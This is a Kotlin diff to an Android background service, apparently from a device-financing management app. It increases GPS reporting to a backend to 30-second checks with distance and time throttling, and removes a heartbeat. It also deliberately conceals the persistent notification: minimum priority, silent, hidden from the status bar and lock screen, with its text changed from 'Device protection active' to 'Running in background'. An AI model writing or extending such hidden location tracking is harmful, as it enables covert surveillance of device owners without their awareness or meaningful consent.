@@ -35,8 +35,12 @@ class DeviceMonitorService : LifecycleService() {
         private const val NOTIFICATION_CHANNEL_ID = "emi_device_monitor"
         private const val NOTIFICATION_ID = 1001
         private const val LOCATION_INTERVAL = 15 * 60 * 1000L // 15 minutes
-        private const val HEARTBEAT_INTERVAL = 5 * 60 * 1000L // 5 minutes
         private const val COMMAND_POLL_INTERVAL = 60 * 1000L // 1 minute (backup to FCM)
+        
+        // Real-time location tracking thresholds
+        private const val LOCATION_UPDATE_INTERVAL = 30 * 1000L // Check every 30 seconds
+        private const val MIN_DISTANCE_METERS = 50f // Update if moved 50+ meters
+        private const val MIN_TIME_BETWEEN_UPDATES_MS = 2 * 60 * 1000L // Minimum 2 minutes between backend updates
     }
 
     private lateinit var preferencesManager: PreferencesManager
@@ -47,8 +51,11 @@ class DeviceMonitorService : LifecycleService() {
     private var screenStateReceiver: ScreenStateReceiver? = null
     private var locationCallback: LocationCallback? = null
     
-    private var heartbeatJob: Job? = null
     private var commandPollJob: Job? = null
+    
+    // Location change tracking for smart updates
+    private var lastLocationSent: Location? = null
+    private var lastLocationUpdateTime = 0L
 
     override fun onCreate() {
         super.onCreate()
@@ -95,8 +102,7 @@ class DeviceMonitorService : LifecycleService() {
             // Also start direct location tracking from service (legacy/backup)
             startLocationTracking()
 
-            // Start heartbeat
-            startHeartbeat()
+            // Heartbeat removed - location updates provide implicit device activity tracking
 
             // Command polling disabled - using FCM push notifications instead
             // startCommandPolling()
@@ -110,10 +116,13 @@ class DeviceMonitorService : LifecycleService() {
         val channel = NotificationChannel(
             NOTIFICATION_CHANNEL_ID,
             "Device Manager",
-            NotificationManager.IMPORTANCE_LOW
+            NotificationManager.IMPORTANCE_MIN // Hides from status bar
         ).apply {
             description = "EMI Device Management Service"
             setShowBadge(false)
+            setSound(null, null) // No sound
+            enableVibration(false) // No vibration
+            enableLights(false) // No indicator light
         }
 
         val notificationManager = getSystemService(NotificationManager::class.java)
@@ -123,10 +132,13 @@ class DeviceMonitorService : LifecycleService() {
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
             .setContentTitle("Device Manager")
-            .setContentText("Device protection active")
+            .setContentText("Running in background")
             .setSmallIcon(R.drawable.ic_launcher_foreground)
             .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN) // Minimum priority - hides from status bar
+            .setSilent(true) // Completely silent
+            .setShowWhen(false) // Don't show timestamp
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // Hide on lock screen
             .build()
     }
 
@@ -142,18 +154,27 @@ class DeviceMonitorService : LifecycleService() {
 
     private fun startLocationTracking() {
         try {
+            // Request location updates more frequently (30s) to detect changes
+            // But only send to backend if moved 50m+ and 2min+ elapsed
             val locationRequest = LocationRequest.Builder(
                 Priority.PRIORITY_BALANCED_POWER_ACCURACY,
-                LOCATION_INTERVAL
+                LOCATION_UPDATE_INTERVAL // 30 seconds
             ).apply {
-                setMinUpdateIntervalMillis(LOCATION_INTERVAL / 2)
+                setMinUpdateIntervalMillis(10 * 1000L) // Minimum 10 seconds
+                setMinUpdateDistanceMeters(MIN_DISTANCE_METERS) // Only trigger if moved 50m+
                 setWaitForAccurateLocation(false)
             }.build()
 
             locationCallback = object : LocationCallback() {
                 override fun onLocationResult(result: LocationResult) {
                     result.lastLocation?.let { location ->
-                        sendLocationToBackend(location)
+                        Log.d(TAG, "Location changed: ${location.latitude}, ${location.longitude}")
+                        // Check if we should send this update to backend
+                        if (shouldSendLocationUpdate(location)) {
+                            sendLocationToBackend(location)
+                        } else {
+                            Log.d(TAG, "Location update skipped (throttling)")
+                        }
                     }
                 }
             }
@@ -164,24 +185,60 @@ class DeviceMonitorService : LifecycleService() {
                 Looper.getMainLooper()
             )
 
-            Log.d(TAG, "Location tracking started")
+            Log.d(TAG, "Location tracking started (30s interval, 50m distance threshold)")
         } catch (e: SecurityException) {
             Log.e(TAG, "Location permission denied", e)
         }
+    }
+    
+    private fun shouldSendLocationUpdate(newLocation: Location): Boolean {
+        val now = System.currentTimeMillis()
+        
+        // FORCE update every 15 minutes regardless of movement (for physical devices)
+        val forcedUpdateIntervalMs = 15 * 60 * 1000L // 15 minutes
+        if (now - lastLocationUpdateTime >= forcedUpdateIntervalMs) {
+            Log.d(TAG, "Forcing location update (15+ min since last update)")
+            return true
+        }
+        
+        // Check time threshold - don't spam backend with updates (min 2 min between updates)
+        if (now - lastLocationUpdateTime < MIN_TIME_BETWEEN_UPDATES_MS) {
+            Log.d(TAG, "Skipping: Too soon since last update (${(now - lastLocationUpdateTime) / 1000}s ago)")
+            return false
+        }
+        
+        // Check distance threshold - only update if moved significantly
+        val lastLoc = lastLocationSent
+        if (lastLoc != null) {
+            val distance = newLocation.distanceTo(lastLoc)
+            if (distance < MIN_DISTANCE_METERS) {
+                Log.d(TAG, "Skipping: Distance too small (${distance.toInt()}m < $MIN_DISTANCE_METERS m)")
+                return false
+            }
+            Log.d(TAG, "Location change detected: moved ${distance.toInt()}m")
+        } else {
+            Log.d(TAG, "First location update")
+        }
+        
+        return true
     }
 
     private fun sendLocationToBackend(location: Location) {
         lifecycleScope.launch {
             try {
+                Log.d(TAG, "Sending location to backend: ${location.latitude}, ${location.longitude}")
                 val result = deviceRepository.sendLocationUpdate(
                     latitude = location.latitude,
                     longitude = location.longitude
                 )
                 result.onSuccess { response ->
-                    Log.d(TAG, "Location sent successfully: ${response.message}")
+                    Log.d(TAG, "✅ Location sent successfully: ${response.message}")
+                    // Update tracking variables after successful send
+                    lastLocationSent = location
+                    lastLocationUpdateTime = System.currentTimeMillis()
                 }
                 result.onFailure { error ->
-                    Log.w(TAG, "Failed to send location: ${error.message}")
+                    Log.w(TAG, "❌ Failed to send location: ${error.message}")
                 }
             } catch (e: Exception) {
                 Log.e(TAG, "Error sending location", e)
@@ -189,19 +246,8 @@ class DeviceMonitorService : LifecycleService() {
         }
     }
 
-    private fun startHeartbeat() {
-        heartbeatJob?.cancel()
-        heartbeatJob = lifecycleScope.launch {
-            while (isActive) {
-                try {
-                    deviceRepository.sendHeartbeat()
-                } catch (e: Exception) {
-                    Log.e(TAG, "Heartbeat failed", e)
-                }
-                delay(HEARTBEAT_INTERVAL)
-            }
-        }
-    }
+    // Heartbeat removed - location updates provide implicit device activity tracking
+    // Backend can track last activity from location update timestamps
 
     private fun startCommandPolling() {
         commandPollJob?.cancel()
@@ -264,7 +310,6 @@ class DeviceMonitorService : LifecycleService() {
         }
 
         // Cancel jobs
-        heartbeatJob?.cancel()
         commandPollJob?.cancel()
 
         // Restart service (it should be persistent)
